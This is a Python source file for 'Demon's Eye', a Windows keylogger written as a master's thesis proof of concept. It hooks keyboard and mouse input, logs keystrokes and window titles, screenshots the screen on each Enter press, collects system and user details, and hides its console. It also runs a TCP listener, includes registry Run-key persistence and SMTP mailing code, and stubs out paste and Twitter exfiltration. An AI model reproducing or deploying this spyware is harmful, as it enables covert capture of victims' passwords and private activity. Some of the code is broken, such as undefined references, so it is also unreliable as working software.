#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# -----------------------------------------------------------------------------------------------------------
#    ____                             _       _____             _  __          _
#   |  _ \  ___ _ __ ___   ___  _ __ ( )___  | ____|   _  ___  | |/ /___ _   _| | ___   __ _  __ _  ___ _ __
#   | | | |/ _ \ '_ ` _ \ / _ \| '_ \|// __| |  _|| | | |/ _ \ | ' // _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
#   | |_| |  __/ | | | | | (_) | | | | \__ \ | |__| |_| |  __/ | . \  __/ |_| | | (_) | (_| | (_| |  __/ |
#   |____/ \___|_| |_| |_|\___/|_| |_| |___/ |_____\__, |\___| |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|
#                                                  |___/                 |___/         |___/ |___/
# -----------------------------------------------------------------------------------------------------------
# Name:             demonseye.py
# Purpose:          ES - Desarrollo de un keylogger para el TFM del Master en Ciberseguridad de La Salle 2019
#                   EN - Development of a keylogger for the TFM of the Master in Cybersecurity of La Salle 2019
#
# Author:           Gabriel Marti Fuentes
# email:            gabimarti at gmail dot com
# GitHub:           https://github.com/gabimarti
# Created:          19/05/2019
# First Release:
# License:          GPLv3
#
# Features:         * Record keystrokes
#                   * Periodic screen capture
#                   * Send data to a remote computer with Monitor App (to do)
#                   * Send data to an email account (to do)
#                   * Send data to a Twitter account (to do)
#                   * Paste data to a Paste service/site (to do)
#
# Required:         Install with "pip install module-name-required"
#                   pywin32, pyWinhook, win32gui, requests, wxPython
#                   This list could be incomplete.
#                   Install the necessary modules that are requested when executing the program.
#
# Binary Gen:       To create the executable in Windows, PyInstaller has been used.
#                   Executable compression is disabled and the creation of a single file is forced.
#                   pyinstaller --noupx -F demonseye.py
#
# Notes:            This code has been tested, developed and designed to work in a Windows environment.
#                   Its purpose is only educational.
#
# Updates:
#
# -----------------------------------------------------------------------------------------------------------
#
#   Reminder for future features to do:
#           - auto clone app / copy to windows tmp
#           - install in win registry
#           - send info to paste service
#           - send info to twitter
#           - hide app
#           - command line params: install registry, hide, etc.
#           - system disk info
#           - memory info
#           - server witch sockets connection
# -----------------------------------------------------------------------------------------------------------
#

import argparse
import atexit
import base64
import datetime
import getpass
import glob
import logging
import os
import platform
import pythoncom
import pyWinhook as pyHook
import smtplib
import socket
import sys
import tempfile
import threading
import time
import urllib.request
import win32console
import win32gui
import winreg
import wx


########################################################
# CONSTANTES - CONSTANTS
########################################################
APPNAME = 'Demon\'s Eye Keylogger'      # Just a name
VERSION = '1.0'                         # Version
LOGGING_LEVEL = logging.DEBUG           # Log Level Debug. Can be -> DEBUG, INFO, WARNING, ERROR, CRITICAL
LOG_FILENAME = 'DEKlogger.log'          # Log filename (This is log for program info and debuge, not keys log)
CRLF = '\n'                             # salto de linea - line feed
KLGPRE = 'klg_'                         # prefijo nombre ficheros de log - prefix name for log files
KLGEXT = '.dek'                         # extension nombre ficheros keylogger - extension for keylogger file
KEYCODE_EXIT = 7                        # CTRL + G > combinación especial para cerrar keylogger - key to close keylogger
SCRPRE = 'scr_'                         # prefijo nombre ficheros captura pantalla - screenshots prefix name
SCREXT = '.png'                         # extension nombre fichero captura pantalla - screenshots extensuib

# Server constants
SERVER_IP = ''
SERVER_PORT = 6666
SERVER_BUFFER_SIZE = 4096
SERVER_MAX_CLIENTS = 5
MAGIC_MESSAGE = '4ScauMiJcywpjAO/OfC2xLGsha45KoX5AhKR7O6T+Iw='
MAGIC_RESPONSE_PLAIN = APPNAME + VERSION
ENCODING = 'utf-8'

# Monitor constants
DEFAULT_MONITOR_PORT = 7777


########################################################
# VARIABLES GLOBALES - GLOBAL VARIABLES
########################################################

# Contador de teclas presionadas - key counter : Future use. At the moment without utility.
key_counter = 0

# Control evento anterior - Previous event control
# Used to detect when the user changes the window or application.
old_event = None

# Buffer de caracteres. Hasta que no se llena, no se graba en el fichero en disco, de esta manera se evitan escrituras
# contínuas a disco por cada tecla pulsada. Cuando de supera el limite de key_max_chars se graba el buffer a disco.
# Character buffer. Until it is full, it is not written to the file on disk, in this way continuous writes to disk are
# avoided for each key pressed. When the key_max_chars limit is exceeded the buffer is written to disk.
key_max_chars = 25
key_buffer = ''

# Control de tamaño de archivo (en bytes) que activa que se envie a almacenamiento remoto cuando el tamaño del fichero
# de keylog supera este tamaño entoces se envia el fichero seguidamente se borra y se crea un nuevo fichero de keylog.
# File size control (in bytes) that activates to be sent to remote storage when the size of the keylog file exceeds
# this size, then the file is sent, then it is deleted and a new keylog file is created.
file_size_trigger = 4096

# Ruta y nombre archivo keylog. Se asigna el nombre en la función create_keylog_file()
# Path and file name keylog. The name is assigned in the create_keylog_file () function
keylog_name = ''

# Control de threads - Thread Control
threadLock = threading.Lock()
threadList = []

# TCP Server control
server_shutdown = False                 # When the server is killed it is set to True
server_has_client = False               # Client connected ?
client_thread = None                    # This is a thread object of Client
server = None                           # Server object instance

# Send to Monitor control variables
monitor_enable_send = False
monitor_ip = None
monitor_port = DEFAULT_MONITOR_PORT


########################################################
# CLASES - CLASSES
########################################################

# Clase multihilo con metodo que toma captura de pantalla y despues la envia a servicios remotos
# Threading class to capture screenshot and send to remote services
class ScreenShootThread (threading.Thread):
    def __init__(self, screen_filename):
        threading.Thread.__init__(self)
        self.screen_file = screen_filename

    def run(self):
        msg = 'Guardado captura ' + self.screen_file
        log_verbose(msg, logging.INFO, 1)
        app = wx.App()                  # Need to create an App instance before doing anything
        screen = wx.ScreenDC()
        size_x, size_y = screen.GetSize()
        bmp = wx.EmptyBitmap(size_x, size_y, -1)
        mem = wx.MemoryDC(bmp)
        mem.Blit(0, 0, size_x, size_y, screen, 0, 0)
        del mem                         # libera memoria que contiene captura de imagen
        del app                         # libera objeto de instancia de la aplicación
        bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
        msg = 'Fin captura ' + self.screen_file
        log_verbose(msg, logging.DEBUG, 2)
        # Send screenshot to remote servers
        # ... pending ...


# Clase multihilo que pone un servidor a la escucha para recibir peticiones del Monitor y
# crea un cliente para la respuesta
# Threading class to listen Monitor petitions and create clients for response
class ClientThread(threading.Thread):
    def __init__(self, conn, ip, port):
        threading.Thread.__init__(self)
        self.conn = conn
        self.ip = ip
        self.port = port
        self.response = base64.b64encode(bytes(MAGIC_RESPONSE_PLAIN,ENCODING))
        # self.response = bytes(MAGIC_RESPONSE_PLAIN,ENCODING)

    def run(self):
        msg = 'Recibida petición de Monitor desde ' + str(self.ip) + ":" + str(self.port)
        log_verbose(msg, logging.INFO, 1)

        # Process data / message
        data = self.conn.recv(SERVER_BUFFER_SIZE).decode(ENCODING).rstrip()
        msg = 'Se ha recibido: ' + data
        log_verbose(msg, logging.DEBUG, 2)
        if data == MAGIC_MESSAGE:
            msg = 'Mensaje correcto. Conexion establecida. Respondiendo {} {}'.format(MAGIC_RESPONSE_PLAIN, self.response)
            log_verbose(msg, logging.DEBUG, 2)
            self.conn.sendall(self.response)
            msg = 'Voy a iniciar conexion a {}:{}'.format(self.ip, monitor_port)
            log_verbose(msg, logging.DEBUG, 2)
            # Inicia comunicación inversa para enviar datos al Monitor
            # Starts reverse comunication to send data to Monitor
            # ... pending ...
        else:
            msg = 'No tiene permiso'
            self.conn.sendall(msg).encode(ENCODING)
            log_verbose(msg, logging.DEBUG, 2)

        self.conn.close()



class ServerListenerThread(threading.Thread):
    def __init__(self, ip = SERVER_IP, port = SERVER_PORT, buffer_size = SERVER_BUFFER_SIZE):
        threading.Thread.__init__(self)
        self.name = APPNAME
        self.ip = ip
        self.port = port
        self.buffer_size = buffer_size
        self.client_threads = []
        self.server_socket = None

    def run(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.ip, self.port))
        msg = APPNAME + ' ' + VERSION + ' : Iniciado servidor en ' + str(self.ip) + ' puerto ' + str(self.port)
        log_verbose(msg, logging.INFO, 1)

        while not server_shutdown:
            self.server_socket.listen(SERVER_MAX_CLIENTS)       # 5 clients are more than enough.
            msg = 'Esperando conexión del Monitor...'           # Normally there is only 1 monitor.
            log_verbose(msg, logging.INFO, 1)
            try:
                (conn, (ip, port)) = self.server_socket.accept()
            except Exception as e:
                msg = 'Error recibiendo datos de cliente. Excepcion {} '.format(e)
                log_verbose(msg, logging.ERROR, 2)
                break                               # Possibly closed server

            # Inicia thread de respuesta - Starts client response thread
            client = ClientThread(conn, ip, port)
            client.start()
            self.client_threads.append(client)

        # Make sure the server is turned off.
        try:
            log_verbose('Shutting Down Server', logging.INFO, 1)
            self.server_socket.shutdown(socket.SHUT_RDWR)
            self.server_socket.close()
        except Exception as e:
            log_verbose('Server already closed', logging.DEBUG, 2)
            log_verbose('Exception {}'.format(e), logging.DEBUG, 2)


########################################################
# FUNCIONES - FUNCTIONS
########################################################

# Funcion para generar mensajes de log y verbose en pantalla
# log_level = logging.DEBUG, logging.INFO, logging.WARNING, logging.ERROR, logging.CRITICAL
# verbose_level = 0, 1, 2, 3
def log_verbose(msg, log_level, verbose_level):
    try:
        msg_encoded = msg.encode('utf-8')
        if log_level == logging.DEBUG:
            logging.debug(msg_encoded)
        elif log_level == logging.INFO:
            logging.info(msg_encoded)
        elif log_level == logging.WARNING:
            logging.warning(msg_encoded)
        elif log_level == logging.ERROR:
            logging.error(msg_encoded)
        elif log_level == logging.CRITICAL:
            logging.critical(msg_encoded)

        if verbose >= verbose_level:
            print(msg)
    except Exception as ex:
        print("Exception %s " % (ex))


# Kill Server and associated clients
def kill_server_clients():
    global server, server_shutdown

    if not server_shutdown and server is not None:
        # Kill clients
        for client in server.clients_threads:
            try:
                client.close()
            except Exception as e:
                log_verbose('Error Killing client. Exception {}'.format(e), logging.ERROR, 2)

        # Kill Server
        try:
            log_verbose('Shutdown server', logging.INFO, 2)
            server.server_socket.shutdown(socket.SHUT_RDWR)
            server.server_socket.close()
        except Exception as e:
            log_verbose('Server already closed', logging.DEBUG, 2)
            log_verbose('Exception {}'.format(e), logging.ERROR, 2)

        server_shutdown = True
        server = None


# función que hace "paste" del contenido del fichero de keylog
# https://pastecode.xyz/api
# https://pastecode.xyz/api/create
#       text=[your paste text]
#       title=[title]
#       name=[name]
#       private=1
#       lang=[language] -> lang=text
#       expire=[minutes]
#
def paste_file():

    return paste_id


# Añade al registro una clave para que se cargue el keylogger en cada inicio del sistema
# Add the file to the startup registry key
def add_keylogger_to_startup():
    fp = os.path.dirname(os.path.realpath(__file__))
    fileName = sys.argv[0].split('\\')[-1]
    newFilePath = fp + '\\' + fileName
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2Change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2Change, 'DEK', 0, REG_SZ, newFilePath)


# Envio de información por email (solo para depuración)
def send_email(message):
    try:
        # Datos
        email_from_addr = '***@gmail.com'
        email_to_addrs = '***@gmail.com'
        email_username = '***@gmail.com'
        email_password = '****'

        # Enviando el correo
        server_mail = smtplib.SMTP('smtp.gmail.com:587')
        server_mail.starttls()
        server_mail.login(email_username, email_password)
        server_mail.sendmail(email_from_addr, email_to_addrs, message)

    except Exception as ex:
        msg = 'No he podido enviar mensaje (' + ex + ')'
        log_verbose(msg, logging.ERROR, 1)

    finally:
        server_mail.quit()


# Oculta la ventana de la aplicación - Hide the application window
def hide_console():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    log_verbose('Oculta consola', logging.DEBUG, 3)


# Obtiene la ip externa - Get the external ip
def get_external_ip():
    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    log_verbose('IP Wan ' + str(external_ip), logging.INFO, 1)
    return external_ip


# Añade información inicial al fichero de keylog - Add initial information to the keylog file
def register_system_info():
    global key_buffer

    key_buffer += '[SYSTEM INFO BEGIN]' + CRLF
    key_buffer += 'cpu=' + cpu + CRLF
    key_buffer += 'os=' + operating_system + CRLF
    key_buffer += 'hostname=' + hostname + CRLF
    key_buffer += 'username=' + username + CRLF
    key_buffer += 'localip=' + localip + CRLF
    key_buffer += 'externalip=' + externalip + CRLF
    key_buffer += 'executable=' + execname + CRLF
    key_buffer += 'extension=' + extension + CRLF
    key_buffer += 'drive=' + driveunit + CRLF
    key_buffer += 'selfpathandfilename=' + keylog_name + CRLF
    key_buffer += 'datetime=' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + CRLF
    key_buffer += '[SYSTEM INFO END]' + CRLF + CRLF


# Guarda el nombre de la ventana activa y lo añade al fichero de keylog
# Save the name of the active window and add it to the keylog file
def register_window_name(text):
    global key_buffer
    key_buffer += CRLF + CRLF + '[WINDOW NAME] ' + text + CRLF
    msg = 'Window Name ' + text
    log_verbose(msg, logging.DEBUG, 3)


# Registra una captura de pantalla, añade el nombre al fichero de keylog y seguidamente inicia un thread para su
# grabación en disco y envio al servicio externo.
# Register a screenshot, add the name to the keylog file and then start a thread for recording to disk and send
# it to the external service.
def capture_screen():
    global key_buffer
    tmp_folder = tempfile.gettempdir() + '\\'
    screen_file = tmp_folder + SCRPRE + datetime.datetime.now().strftime("%y%m%d%H%M%S") + SCREXT
    key_buffer += CRLF + CRLF + '[SCREENSHOT] ' + screen_file + CRLF
    pantalla = ScreenShootThread(screen_file)
    threadList.append(pantalla)
    pantalla.start()


# Ejecuta las acciones necesarias para enviar el fichero de keylog a los diferentes recursos o servicios
# que se hayan definido.
# Execute the necessary actions to send the keylog file to the different resources or services that have been defined.
def send_keylog_file():
    global keylog_name
    '''
    Aqui envia el fichero al servidor  o servicios configurados
    Hacer un 'paste' en un servidor
    Publicar un tweet en cuenta privada con la url del paste
    Opcionalmente hace envio por email para pruebas
    '''
    return True


# Borra todos los ficheros temporales del keylog - Delete all temporary keylog files
# Se puede establecer un patron y un mensaje y se reaprovecha para borrar los ficheros de captura de pantalla.
# A pattern and a message can be set and reused to erase the screenshot files.
def delete_keylog_tempfile(pattern = None, logmsg = 'Borrado fichero temporal'):
    if pattern == None:                     # Si no se recibe patron, por defecto borra todos los ficheros de keylog
        pattern = KLGPRE + '*' + KLGEXT     # If no pattern is received, by default it deletes all keylog files

    count = 0
    folder_files = tempfile.gettempdir() + '\\' + pattern
    for file_remove in glob.glob(folder_files):
        msg = logmsg + ' : ' + file_remove
        log_verbose(msg, logging.INFO, 3)
        os.remove(file_remove)
        count += 1

    return count    # Return number of deleted files (if needed)


# Crea fichero de keylog - Create keylog file
def create_keylog_file():
    global keylog_name, key_buffer

    # Crea fichero de keylog en la carpeta temporal del usuario
    # Create keylog file in the user's temporary folder
    prefix = KLGPRE + datetime.datetime.now().strftime('%y%m%d%H%M')
    ftemp, keylog_name = tempfile.mkstemp(KLGEXT, prefix)
    msg = 'Create keylogger file ' + keylog_name
    log_verbose(msg, logging.INFO, 2)
    f = open(keylog_name, 'w+')
    f.close()

    key_buffer = ''                     # Nos aseguramos de tener el buffer vacio - Empty buffer
    register_system_info()              # Guardamos información general del sistema - Save system info
    return True


# Vacia el buffer del teclado sobre el fichero de disco - Empty the keyboard buffer over the disk file
def flush_key_buffer_to_disk():
    global key_buffer, keylog_name

    # Añade buffer a fichero de disco - Append to file
    f = open(keylog_name, 'a')
    f.write(key_buffer)
    f.close()

    key_buffer = ''
    return True


# En caso de teclas especiales, retorna True para las que queramos que queden registradas
# o False para las que no deseemos que queden registradas.
# si no encuentra la tecla en la lista, retorna True por defecto
# para poder registrar teclas desconocidas hasta el momento
def save_special_control_key(event):
    switcher = {
        'TAB': True, 'LSHIFT': False, 'RSHIFT': False, 'CAPITAL': True, 'LCONTROL': True, 'RCONTROL': True,
        'LMENU': True, 'RMENU': True, 'LWIN': False, 'RETURN': True
    }
    return switcher.get(event.Key.upper(), True)


# Añade tecla al buffer y si este esta lleno se vacia al disco - Adds key to buffer
def add_key_to_buffer(event):
    global key_buffer, key_max_chars, key_counter
    key = event.Ascii

    # asigna tecla. si es una tecla especial asigna string definiendo tipo de tecla
    # si se desea mostrar el espacio como [SPACE] se debe de indicar (key < 33)
    # en la condicion inferior, sino se mostrara un espacio en blanco tal cual.
    if (key < 32) or (key > 126):
        if save_special_control_key(event):
            ckey = '[' + event.Key.upper() + ']'
            # Cada vez que se pulsa RETURN añade salto de linea y hace captura de pantalla
            # With each press of RETURN add the line break and take a screenshot.
            if ckey == '[ENTER]' or ckey == '[RETURN]':
                ckey += CRLF
                key_buffer += ckey
                capture_screen()
        else:
            ckey = ''
    else:
        ckey = chr(key)
        key_buffer += ckey

    # incrementa contador de teclas (de momento sin uso definido) - inc key counter. without use at the moment
    if len(ckey) > 0:
        key_counter += 1

    # si buffer esta lleno lo vacia y envia el fichero en caso de ser necesario
    if len(key_buffer) > key_max_chars:
        flush_key_buffer_to_disk()
        send_keylog_file()

    return True


# Control eventos de ratón. No se registran eventos de raton excepto los cambios de ventana
# Mouse events control. No mouse events are recorded except window changes
def on_mouse_event(event):
    global old_event

    # si el usuario cambia de ventana, la registra
    if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
        register_window_name(repr(event.WindowName))

    old_event = event
    return 1            # IMPORTANT. An integer other than 0 must be returned


# Control eventos de teclado - Keyboard events control
def on_keyboard_event(event):
    global key_buffer, key_counter, old_event

    try:
        # Logging and verbose (for debug) of keystrokes and related info
        msg = 'Time: ' + repr(event.Time)
        log_verbose(msg, logging.DEBUG, 3)
        msg = 'MessageName: ' + repr(event.MessageName) + ' Message: ' + repr(event.Message)
        log_verbose(msg, logging.DEBUG, 3)
        msg = 'Window: ' + repr(event.Window) + ' WindowName: ' + event.WindowName
        log_verbose(msg, logging.DEBUG, 3)
        msg = 'Ascii: ' + repr(event.Ascii) + ' Chr: ' + repr(chr(event.Ascii))
        log_verbose(msg, logging.DEBUG, 3)
        msg = 'Key: ' + repr(event.Key) + ' KeyID: ' + repr(event.KeyID)
        log_verbose(msg, logging.DEBUG, 3)
        msg = 'ScanCode: ' + repr(event.ScanCode) + ' Extended: ' + repr(event.Extended)
        log_verbose(msg, logging.DEBUG, 3)
        msg = 'Injected: ' + repr(event.Injected) + ' Alt: ' + repr(event.Alt)
        log_verbose(msg, logging.DEBUG, 3)
        msg = 'Transition: ' + repr(event.Transition)
        log_verbose(msg, logging.DEBUG, 3)

        # Si presiona combinación especial para salir y desactivar el KeyLogger
        # If especial key to close keylogger is pressed
        if event.Ascii == KEYCODE_EXIT:
            msg = 'Cerrando aplicación por combinación especial de tecla ' + repr(event.Ascii)
            log_verbose(msg, logging.INFO, 2)
            key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
            sys.exit(0)

        # Si el usuario cambia de ventana, la registra
        # If user change active window
        if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
            register_window_name(repr(event.WindowName))

        # guarda caracter en el buffer - save key to buffer
        add_key_to_buffer(event)

        # Guarda evento actual para comparar con el siguiente y poder controlar si se mantienen pulsadas teclas especiales
        # o saber si se cambia de ventana.
        # Saves current event info to compare with next one.
        old_event = event
    except Exception as ex:
        print("Exception %s " % (ex))

    return 1            # IMPORTANT. An integer other than 0 must be returned


# Función que ejecutará al cerrar el programa - Whe program is closed
def on_close_program():
    global key_buffer, threadList

    # registra en fichero de log el cerrado del programa con fecha y hora
    # saves to keylog file the Closing Event, Date and Time
    key_buffer += CRLF + CRLF
    key_buffer += '[CLOSING PROGRAM]' + CRLF
    key_buffer += 'datetime=' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + CRLF

    # se asegura de vaciar buffer - empty the key buffer to disk
    flush_key_buffer_to_disk()

    # envia ultimo fichero de log de teclas - send de last keylog capture file
    send_keylog_file()

    # ejecuta captura de pantalla - do a screenshot
    capture_screen()

    # kill server
    kill_server()

    # espera que finalicen todos los threads que pueda haber activos
    # wait to all threads are finished
    for thr in threadList:
        thr.join()

    # borra ficheros temporales - delete temp files
    delete_keylog_tempfile()
    delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura pantalla')

    log_verbose('Cerrando', logging.INFO, 2)
    logging.shutdown()


'''
Control parametros linea de comando, para instalar, configurar, ajustar.
NO IMPLEMENTADO TODAVIA
'''
# Parse command line parameters
def parse_params():
    parser = argparse.ArgumentParser(description=APPNAME + ' ' + VERSION,
                                     epilog='Keylogger POC for MCS TFM La Salle 2019 by Gabriel Marti.')
    parser.add_argument('-s', '--start', action='store_true', required=True,
                        help='Specify -s or --start to start Keylogger')
    parser.add_argument('-v', '--verbose', type=int, choices=[0, 1, 2, 3], default=0,
                        help='Debug verbose to screen. Default value: 0')
    parser.add_argument('-p', '--ports', type=int, nargs='+',
                        help='Specify a list of ports to scan. ')
    parser.add_argument('-m', '--message', type=str, default=MAGIC_MESSAGE,
                        help='Message to send to host. If empty, -m \'\', then not message is sent. Default value: ' + MAGIC_MESSAGE)
    parser.add_argument('-t', '--timeout', type=int,
                        help='Timeout in seconds on port connection.')
    args = parser.parse_args()
    return args


########################################################
# MAIN
########################################################

# Establece log de depuración - Set debug log
logFormat = '%(asctime)s %(levelname)s:%(message)s'
logDateFmt = '%d/%m/%Y %I:%M:%S %p'
logging.basicConfig(filename=LOG_FILENAME, filemode='w', level=LOGGING_LEVEL, format=logFormat, datefmt=logDateFmt)

# Parsea parametros recibidos - Parse parameters
# Check and parse parameters
args = parse_params()
verbose = args.verbose
log_verbose('Verbose Level: ' + str(verbose), logging.INFO, 1)

# Inicializa variables con información del sistema y el usuario - Init some useful variables
cpu = platform.processor()
operating_system = platform.platform()
hostname = socket.gethostname()
username = getpass.getuser()
localip = socket.gethostbyname(hostname)
externalip = get_external_ip()
execname = sys.argv[0]                              # modo alternativo > execname = os.path.realpath(__file__)
extension = os.path.splitext(__file__)[1]
driveunit = os.path.splitdrive(__file__)[0]

# Se asegura de que el kelogger se inicia en cada arranque del sistema
# Ensures that keylogger starts at system startup
# add_keylogger_to_startup()

# Oculta ventana de aplicación - Hide console Window
hide_console()

# Borra todos los archivos de keylog antiguos (si existen) - Delete old keylog files if exists
delete_keylog_tempfile()

# Borra todos los archivos de captura de pantalla antiguos (si existen) - Delete old screenshots
delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura de pantalla anterior')

# Crea el archivo que registra las teclas - Create new keylog file
create_keylog_file()

# Crea el objeto hook manager - Creates new hook manager
hm = pyHook.HookManager()

# Registra callbacks de control de eventos - Register event callbacks
hm.MouseAllButtonsDown = on_mouse_event
hm.KeyDown = on_keyboard_event

# Establece el hook de eventos de ratón y teclado - Sets hook for Mouse and Keyboard
hm.HookMouse()
hm.HookKeyboard()

# Registra handler de la función que se ejecutará al terminar la aplicación
# Handler to do actions when application is closed
atexit.register(on_close_program)

# Crea Servidor a la escucha de peticiones TCP del Monitor
# Create server that listens TCP petitions from Monitor
server = ServerListenerThread(SERVER_IP, SERVER_PORT, SERVER_BUFFER_SIZE)
server.start()

# Espera indefinidamente hasta que se produce combinación de salida del keylogger - Wait indefinitely
pythoncom.PumpMessages()
